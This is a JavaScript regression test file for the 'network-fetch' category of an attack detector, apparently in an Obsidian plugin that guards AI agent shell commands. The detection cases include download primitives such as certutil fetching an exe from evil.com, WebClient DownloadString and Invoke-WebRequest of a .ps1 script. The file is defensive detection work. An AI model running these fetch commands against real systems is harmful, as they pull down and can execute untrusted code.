/**
 * Regression tests for the `network-fetch` category added in the v0.9
 * pattern-hardening arc.
 *
 * Design principle (see docs/adr/0001): in a knowledge-management +
 * AI-agent context, downloading content from the internet is rarely
 * the user's actual goal. We flag fetch primitives where a URL is
 * present, but must not over-fire on `--version` / `--help` / `which`
 * style env-probing.
 */

const test = require("node:test");
const assert = require("node:assert/strict");
const Module = require("module");

const stubPath = require.resolve("./_stubs/obsidian.js");
const originalResolve = Module._resolveFilename;
Module._resolveFilename = function (request, ...args) {
  if (request === "obsidian") return stubPath;
  return originalResolve.call(this, request, ...args);
};

const { classify } = require("../src/attack-detector");

const ctx = () => ({
  vaultRoot: "/tmp/vault",
  plugin: {
    settings: {
      protectedCommandsEnabled: true,
      protectedCommandsDisabled: [],
      protectedCommandsCustom: [],
    },
  },
});

function detects(cmd, expectedCategory) {
  const res = classify("Bash", { command: cmd }, ctx());
  assert.ok(res, `should detect: ${cmd}`);
  if (expectedCategory) {
    assert.equal(res.category, expectedCategory, `expected category ${expectedCategory} for ${cmd}`);
  }
  return res;
}
function doesNotDetect(cmd) {
  const res = classify("Bash", { command: cmd }, ctx());
  assert.equal(res, null, `should NOT detect: ${cmd}`);
}

// ── Fetch primitives WITH URL are flagged ──────────────────────────

test("curl with URL is detected", () =>
  detects("curl -s http://example.com/x", "network-fetch"));
test("curl with https URL is detected", () =>
  detects("curl https://example.com/x.sh"));
test("wget with URL is detected", () =>
  detects("wget -qO- http://example.com/foo", "network-fetch"));
test("Invoke-WebRequest with URL is detected", () =>
  detects("Invoke-WebRequest http://x/y.ps1", "network-fetch"));
test("iwr with URL is detected", () => detects("iwr http://x/y"));
test("Invoke-RestMethod with URL is detected", () =>
  detects("Invoke-RestMethod -Uri https://api.example.com/data"));
test("irm with URL is detected", () => detects("irm https://x/api"));
test("Start-BitsTransfer is detected", () =>
  detects("Start-BitsTransfer -Source http://x/y -Destination C:\\\\temp\\\\y", "network-fetch"));
test("New-Object Net.WebClient is detected", () =>
  detects("(New-Object Net.WebClient).DownloadString('http://x')"));
test("New-Object System.Net.WebClient is detected", () =>
  detects("New-Object System.Net.WebClient"));
test("certutil -urlcache is detected", () =>
  detects("certutil -urlcache -f http://evil.com/x x.exe", "network-fetch"));
test("certutil.exe -urlcache is detected", () =>
  detects("certutil.exe -urlcache -split -f http://evil/y"));
test("fetch with URL is detected", () =>
  detects("fetch http://example.com/foo.tar.gz"));
test("aria2c with URL is detected", () =>
  detects("aria2c -x 16 https://example.com/large.iso"));

// ── Fetch primitives WITHOUT URL are NOT flagged ───────────────────

test("curl --version does NOT trigger", () => doesNotDetect("curl --version"));
test("curl --help does NOT trigger", () => doesNotDetect("curl --help"));
test("curl -V does NOT trigger", () => doesNotDetect("curl -V"));
test("wget --version does NOT trigger", () => doesNotDetect("wget --version"));
test("which curl does NOT trigger", () => doesNotDetect("which curl"));
test("where curl does NOT trigger", () => doesNotDetect("where curl"));
test("man curl does NOT trigger", () => doesNotDetect("man curl"));
test("type curl does NOT trigger", () => doesNotDetect("type curl"));
test("grep 'curl' in a file does NOT trigger", () =>
  doesNotDetect("grep -r 'curl' ./notes"));
test("echo about curl does NOT trigger", () =>
  doesNotDetect("echo 'I use curl a lot'"));

// ── Guard rails against over-broad matching ────────────────────────

test("certutil -hashfile does NOT trigger (legitimate hash use)", () =>
  doesNotDetect("certutil -hashfile C:\\\\temp\\\\file.txt SHA256"));
test("bare 'fetch' string in prose does NOT trigger", () =>
  doesNotDetect("echo 'let me fetch the data'"));
